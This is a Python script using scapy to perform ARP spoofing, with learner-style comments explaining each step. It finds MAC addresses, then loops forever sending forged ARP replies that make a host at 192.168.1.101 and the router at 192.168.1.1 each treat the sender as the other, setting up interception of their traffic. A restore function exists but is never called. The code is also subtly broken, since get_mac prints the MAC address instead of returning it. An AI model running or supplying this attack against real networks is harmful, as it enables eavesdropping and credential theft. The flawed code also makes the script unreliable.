from scapy.layers.l2 import ARP,Ether,srp
from scapy.packet import ls
from scapy.all import send
import time
def get_mac(ip):
    """""
    1)Making arp request (Who has some ip)
    2)setting destination for packet(For setting that Ether()is used)
       Destination is for reaching the packet
       Source is for resending(i.e,ARP Response)
    3)combining the two variables using(/)
    4)sending request as packet(srp())
    5)returning mac address
    """""

    arp_request=ARP(pdst=ip)
    source_and_destination=Ether(dst="ff:ff:ff:ff:ff:ff")
    join=source_and_destination/arp_request
    answered_list=srp(join,timeout=1,verbose=False)[0]
    #list of list >>[test,[1,2]]
    print(answered_list[0][1].hwsrc)
"""""
   Output for print(answered_list[0]):
    REQUEST:-(<Ether  dst=ff:ff:ff:ff:ff:ff type=ARP |<ARP  pdst=192.168.1.1 |>>, 
    RESPONSE:-<Ether  dst=b8:08:cf:fa:cd:19 src=bc:8a:e8:19:ae:b5 type=ARP |<ARP  hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 
    op=is-at hwsrc=bc:8a:e8:19:ae:b5 psrc=192.168.1.1 hwdst=b8:08:cf:fa:cd:19 pdst=192.168.1.100 |>>)
"""""

def send_packet(target_ip,spoof_ip):
    """
      6)calling the get_mac method and passing target ip
     "1)Creating a packet\n"
     "2)pdst-destination for the packet(target computer)\n"
     "3)hwdst-destination mac address(target)\n"
     "4)op-operation(1-request,2-response)\n"
     "5)psrc-source ip address(Here we are faking that we are the router so give router ip)\n"

     """
    mac=get_mac(target_ip)
    packet=ARP(pdst=target_ip,hwdst=mac,op=2,psrc=spoof_ip)
    #print(ls(ARP))
    send(packet)
    #TO restore everything to normal
def restore(destination_ip,source_ip):
    destination_mac=get_mac(destination_ip)
    source_mac=get_mac(source_ip)
    packet=ARP(pdst=destination_ip,hwdst=destination_mac,op=2,psrc=source_ip,hwsrc=source_mac)
   #count=4  means sending 4 times this packet to make sure running correctly
    send(packet,count=4,verbose=False)
counter=0
while True:

    send_packet("192.168.1.101","192.168.1.1")
    send_packet("192.168.1.1","192.168.1.101")
    counter = counter + 2
    time.sleep(1)
